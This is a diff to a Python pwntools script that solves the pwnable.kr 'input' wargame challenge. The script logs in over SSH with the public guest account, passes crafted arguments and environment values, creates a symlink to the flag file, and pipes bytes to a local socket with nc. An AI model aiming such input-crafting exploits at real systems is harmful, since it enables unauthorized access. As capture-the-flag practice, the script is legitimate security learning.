@@ -1,8 +1,11 @@
 #!/usr/bin/python
 
 from pwn import *
+import socket
 
 # prepare payload
+socket_port = 9050
+
 cmd = []
 cmd.append('/home/input2/input')
 for num in range(1, 100):
@@ -10,15 +13,22 @@ for num in range(1, 100):
         cmd.append('\x00')
     elif num == 66:
         cmd.append('\x20\x0a\x0d')
+    elif num == 67:
+        cmd.append(str(socket_port))
     else:
         cmd.append(str(num));
-print '\ncmd: ', cmd
+#print '\ncmd: ', cmd
 
 env = {}
 env['\xde\xad\xbe\xef'] = '\xca\xfe\xba\xbe'
 
-create_file = 'cd /tmp; echo -ne "\x00\x00\x00\x00" > "\n";'
-print '\ncreate_file: ', create_file
+create_file = 'mkdir /tmp/rawr; cd /tmp/rawr; echo -ne "\x00\x00\x00\x00" > "\n";'
+#print '\ncreate_file: ', create_file
+
+send_to_socket = 'echo -ne "\xde\xad\xbe\xef" | nc localhost ' + str(socket_port)
+#print '\nsend_to_socket: ', send_to_socket
+
+create_flag_link = 'cd /tmp/rawr; ln -sf /home/input2/flag flag;'
 
 # open connection
 s = ssh(host='pwnable.kr',
@@ -26,7 +36,8 @@ s = ssh(host='pwnable.kr',
     port=2222,
     password='guest')
 s.run_to_end(create_file)
-sh = s.process(argv=cmd, stdin=sys.stdin, stderr=sys.stdin, env=env, cwd='/tmp')
+s.run_to_end(create_flag_link)
+sh = s.process(argv=cmd, stdin=sys.stdin, stderr=sys.stdin, env=env, cwd='/tmp/rawr/')
 
 # stage 1
 print sh.recvline()
@@ -42,4 +53,9 @@ print sh.recvline()
 print sh.recvline()
 
 # stage 4
+print sh.recvline()
+
+# stage 5
+s.run_to_end(send_to_socket)
+print sh.recvline()
 print sh.recvline()
